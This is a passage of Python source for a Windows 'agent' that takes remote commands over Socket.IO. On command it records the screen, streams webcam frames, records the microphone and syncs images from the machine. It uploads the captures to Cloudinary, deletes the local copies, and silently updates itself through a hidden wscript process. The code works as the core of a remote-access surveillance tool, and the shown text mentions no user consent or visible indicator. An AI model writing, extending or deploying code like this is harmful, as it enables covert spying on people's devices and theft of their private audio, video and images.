        file.write(vbs_content)

    flags = 0
    flags |= getattr(subprocess, "DETACHED_PROCESS", 0)
    flags |= getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
    flags |= getattr(subprocess, "CREATE_NO_WINDOW", 0)

    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0

    subprocess.Popen(
        ["wscript", "//B", "//Nologo", updater_vbs_path],
        creationflags=flags,
        startupinfo=startup_info,
        close_fds=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    log_error(f"Updater paths: currentExe={current_exe} targetExe={target_exe} newExe={new_exe_path}")
    log_error(f"Updater launched for version {target_version}: {updater_script_path}")
    emit_update_state("installing", {'targetVersion': target_version})
    time.sleep(1)
    os._exit(0)


def check_for_agent_updates(force=False, source="watchdog"):
    global update_last_checked_at
    global update_in_progress

    if not AUTO_UPDATE_ENABLED:
        if force:
            emit_update_state("skipped", {'reason': 'auto_update_disabled', 'trigger': source})
        return
    if not UPDATE_MANIFEST_URL:
        if force:
            emit_update_state("skipped", {'reason': 'manifest_missing', 'trigger': source})
        return
    if not getattr(sys, "frozen", False):
        if force:
            emit_update_state("skipped", {'reason': 'not_packaged_exe', 'trigger': source})
        return

    now = time.time()
    if not force and (now - update_last_checked_at) < UPDATE_CHECK_INTERVAL_SECONDS:
        return

    if not update_lock.acquire(blocking=False):
        if force:
            emit_update_state("skipped", {'reason': 'check_busy', 'trigger': source})
        return

    try:
        update_last_checked_at = now

        if update_in_progress:
            if force:
                emit_update_state("skipped", {'reason': 'update_in_progress', 'trigger': source})
            return

        manifest = fetch_update_manifest()
        if not manifest:
            return

        latest_version = manifest['version']
        if not is_newer_version(AGENT_VERSION, latest_version):
            log_error(f"Auto-update check: up-to-date (local={AGENT_VERSION}, remote={latest_version})")
            if force:
                emit_update_state("up_to_date", {'targetVersion': latest_version, 'trigger': source})
            return

        update_in_progress = True
        emit_update_state("downloading", {'targetVersion': latest_version, 'trigger': source})
        log_error(f"Auto-update available: {AGENT_VERSION} -> {latest_version}")

        downloaded_file = download_update_binary(
            manifest['url'],
            manifest.get('sha256', ""),
            manifest.get('size', 0),
        )
        log_error(f"Auto-update downloaded: {downloaded_file}")

        launch_windows_updater(downloaded_file, latest_version)
    except Exception as error:
        update_in_progress = False
        message = f"Auto-update error: {error}"
        log_error(message)
        emit_update_state("failed", {'error': str(error), 'trigger': source})
    finally:
        update_lock.release()


def update_watchdog_loop():
    while True:
        try:
            check_for_agent_updates(force=False, source="watchdog")
        except Exception as error:
            log_error(f"Update watchdog loop error: {error}")
        time.sleep(UPDATE_CHECK_INTERVAL_SECONDS)


def build_playable_video_url(upload_response):
    secure_url = upload_response.get("secure_url")
    if not secure_url:
        return None

    upload_marker = "/video/upload/"
    if upload_marker not in secure_url:
        return secure_url

    return secure_url.replace(upload_marker, "/video/upload/f_mp4,vc_h264/", 1)

def upload_to_cloudinary(file_path, media_type="video"):
    """Uploads a media file and sends the URL back to the server."""
    if not CLOUDINARY_READY:
        message = "Cloudinary credentials missing. Skipping upload."
        print(message)
        log_error(message)
        return

    try:
        print(f"Uploading {media_type} {file_path} to Cloudinary...")
        log_error(f"Uploading {media_type} to Cloudinary: {file_path}")
        response = cloudinary.uploader.upload(file_path, resource_type="video")
        media_url = build_playable_video_url(response) if media_type == "video" else response.get("secure_url")
        media_url = media_url or response.get("secure_url")
        print(f"Upload Success ({media_type}): {media_url}")
        log_error(f"Upload success ({media_type}): {media_url}")

        event_name = 'audio_upload_complete' if media_type == "audio" else 'video_upload_complete'
        sio.emit(event_name, {'url': media_url, 'machine': MACHINE_NAME, 'mediaType': media_type})

        # Cleanup local file to save space
        os.remove(file_path)
        log_error(f"Local file removed after upload: {file_path}")
    except Exception as e:
        print(f"Cloudinary Error ({media_type}): {e}")
        log_error(f"Cloudinary Error ({media_type}): {e}")

def record_loop():
    global is_recording
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = os.path.join(RECORDING_DIR, f"rec_{timestamp}.mp4")
    out = None
    frames_written = 0

    try:
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(file_path, fourcc, FPS, screen_size)
        if not out.isOpened():
            log_error(f"VideoWriter failed to open: {file_path}")
            return

        log_error(f"Recording started: {file_path}")
        while is_recording:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            frames_written += 1
            time.sleep(1/FPS)
    except Exception as error:
        log_error(f"Recording loop error: {error}")
    finally:
        if out is not None:
            out.release()
        is_recording = False
        emit_agent_state('record_loop_stopped')
        log_error(f"Recording stopped: {file_path}")
        # Trigger upload in background
        if frames_written > 0 and os.path.exists(file_path):
            threading.Thread(target=upload_to_cloudinary, args=(file_path, 'video'), daemon=True).start()
        else:
            log_error(f"Upload skipped (frames={frames_written}, exists={os.path.exists(file_path)}): {file_path}")


def voice_record_loop():
    global is_voice_recording
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = os.path.join(RECORDING_DIR, f"voice_{timestamp}.wav")
    samples_written = 0

    try:
        if sd is None:
            raise RuntimeError("sounddevice module unavailable")

        with wave.open(file_path, 'wb') as wav_file:
            wav_file.setnchannels(AUDIO_CHANNELS)
            wav_file.setsampwidth(2)
            wav_file.setframerate(AUDIO_SAMPLE_RATE)

            with sd.InputStream(
                samplerate=AUDIO_SAMPLE_RATE,
                channels=AUDIO_CHANNELS,
                dtype='int16',
                blocksize=AUDIO_BLOCK_FRAMES
            ) as input_stream:
                log_error(f"Voice recording started: {file_path}")
                while is_voice_recording:
                    frames, overflowed = input_stream.read(AUDIO_BLOCK_FRAMES)
                    wav_file.writeframes(frames.tobytes())
                    samples_written += len(frames)
                    if overflowed:
                        log_error("Voice stream overflow detected")
    except Exception as error:
        log_error(f"Voice recording loop error: {error}")
    finally:
        is_voice_recording = False
        emit_agent_state('voice_loop_stopped')
        log_error(f"Voice recording stopped: {file_path}")

        if samples_written > 0 and os.path.exists(file_path):
            threading.Thread(target=upload_to_cloudinary, args=(file_path, 'audio'), daemon=True).start()
        else:
            log_error(f"Voice upload skipped (samples={samples_written}, exists={os.path.exists(file_path)}): {file_path}")

def camera_stream_loop():
    global is_camera_on
    cap = cv2.VideoCapture(0)
    try:
        log_error("Camera stream started")
        while is_camera_on:
            ret, frame = cap.read()
            if not ret: break
            frame = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            sio.emit('camera_frame', {'image': jpg_as_text})
            time.sleep(0.1)
    except Exception as error:
        log_error(f"Camera loop error: {error}")
    finally:
        cap.release()
        is_camera_on = False
        emit_agent_state('camera_loop_stopped')
        log_error("Camera stream stopped")


@sio.event
def connect():
    log_error(f"Connected to {SERVER_URL}")
    sio.emit('register_node', {'machine': MACHINE_NAME})
    emit_agent_state('connected')
    emit_image_sync_snapshot()
    threading.Thread(target=check_for_agent_updates, kwargs={'force': True, 'source': 'connect'}, daemon=True).start()


@sio.event
def disconnect():
    log_error("Disconnected from server")

@sio.on('start_capture')
def on_start(data=None):
    global is_recording

    try:
        pyautogui.screenshot(region=(0, 0, 1, 1))
    except Exception as error:
        log_error(f"start_capture blocked: screen capture runtime unavailable: {error}")
        emit_agent_state('start_capture_failed')
        return

    with recording_lock:
        if not is_recording:
            is_recording = True
            log_error("start_capture received")
            threading.Thread(target=record_loop, daemon=True).start()
    emit_agent_state('start_capture')

@sio.on('stop_capture')
def on_stop(data=None):
    global is_recording
    log_error("stop_capture received")
    is_recording = False
    emit_agent_state('stop_capture')

@sio.on('start_camera')
def on_camera_start(data=None):
    global is_camera_on
    with camera_lock:
        if not is_camera_on:
            is_camera_on = True
            log_error("start_camera received")
            threading.Thread(target=camera_stream_loop, daemon=True).start()
    emit_agent_state('start_camera')

@sio.on('stop_camera')
def on_camera_stop(data=None):
    global is_camera_on
    log_error("stop_camera received")
    is_camera_on = False
    emit_agent_state('stop_camera')


@sio.on('start_voice_capture')
def on_voice_start(data=None):
    global is_voice_recording

    if sd is None:
        log_error("start_voice_capture blocked: sounddevice is unavailable")
        emit_agent_state('start_voice_capture_failed')
        return

    with voice_lock:
        if not is_voice_recording:
            is_voice_recording = True
            log_error("start_voice_capture received")
            threading.Thread(target=voice_record_loop, daemon=True).start()

    emit_agent_state('start_voice_capture')


@sio.on('stop_voice_capture')
def on_voice_stop(data=None):
    global is_voice_recording
    log_error("stop_voice_capture received")
    is_voice_recording = False
    emit_agent_state('stop_voice_capture')


@sio.on('force_update_check')
def on_force_update_check(data=None):
    log_error("force_update_check received")
    threading.Thread(target=check_for_agent_updates, kwargs={'force': True, 'source': 'admin'}, daemon=True).start()


def handle_find_image_and_save(data=None, event_name="find_image_and_save"):
    force_rescan = False
    if isinstance(data, dict):
        force_rescan = bool(data.get('forceRescan', False))

    log_error(f"{event_name} received (forceRescan={force_rescan})")
    started = start_image_sync(force_rescan=force_rescan, trigger_source=event_name)
    if started:
        emit_image_sync_state('queued', {'trigger': event_name, 'forceRescan': force_rescan})


@sio.on('find_image_and_save')
def on_find_image_and_save(data=None):
    handle_find_image_and_save(data=data, event_name='find_image_and_save')


@sio.on('start_image_sync')
def on_start_image_sync(data=None):
    handle_find_image_and_save(data=data, event_name='start_image_sync')


@sio.on('stop_find_image_and_save')
def on_stop_find_image_and_save(data=None):
    log_error("stop_find_image_and_save received")
    stop_image_sync(trigger_source='stop_find_image_and_save')


@sio.on('stop_image_sync')
def on_stop_image_sync(data=None):
    log_error("stop_image_sync received")
    stop_image_sync(trigger_source='stop_image_sync')


@sio.on('reset_image_sync')
def on_reset_image_sync(data=None):
    clear_uploaded_hashes = True
    if isinstance(data, dict):
        clear_uploaded_hashes = bool(data.get('clearUploadedHashes', True))
    log_error(f"reset_image_sync received (clearUploadedHashes={clear_uploaded_hashes})")
    reset_image_sync(trigger_source='reset_image_sync', clear_uploaded_hashes=clear_uploaded_hashes)


@sio.on('stop_and_reset_image_sync')
def on_stop_and_reset_image_sync(data=None):
    clear_uploaded_hashes = True
    if isinstance(data, dict):
        clear_uploaded_hashes = bool(data.get('clearUploadedHashes', True))
    log_error(f"stop_and_reset_image_sync received (clearUploadedHashes={clear_uploaded_hashes})")
    reset_image_sync(trigger_source='stop_and_reset_image_sync', clear_uploaded_hashes=clear_uploaded_hashes)


@sio.on('get_image_sync_status')
def on_get_image_sync_status(data=None):
    log_error("get_image_sync_status received")
    emit_image_sync_snapshot()

if __name__ == "__main__":
    log_error(f"Agent booted. pid={os.getpid()} exe={os.path.abspath(sys.executable)} version={AGENT_VERSION} autoUpdate={AUTO_UPDATE_ENABLED}")
    if getattr(sys, "frozen", False):
        preferred_exe = get_canonical_packaged_exe_path()
        current_exe = os.path.abspath(sys.executable)
        if preferred_exe and os.path.normcase(preferred_exe) != os.path.normcase(current_exe):
            log_error(f"Running from non-canonical executable. current={current_exe} preferred={preferred_exe}")
    if embedded_agent_version_source:
        log_error(f"Agent version source: embedded build version file ({embedded_agent_version_source})")
    elif agent_version_from_env:
        log_error("Agent version source: environment variable AGENT_VERSION")
    elif agent_version_source:
        log_error(f"Agent version source: {agent_version_source}")
    else:
        log_error("Agent version source: default fallback (1.0.0)")
    if AUTO_UPDATE_ENABLED and UPDATE_MANIFEST_URL and getattr(sys, "frozen", False):
        log_error(f"Auto-update enabled. manifest={UPDATE_MANIFEST_URL}")
        threading.Thread(target=update_watchdog_loop, daemon=True).start()
    else:
        log_error("Auto-update disabled or not configured")

    while True:
        try:
            sio.connect(SERVER_URL, wait_timeout=10)
            sio.wait()
        except Exception as e:
            log_error(f"Connection error: {e}")

        time.sleep(RECONNECT_DELAY_SECONDS)
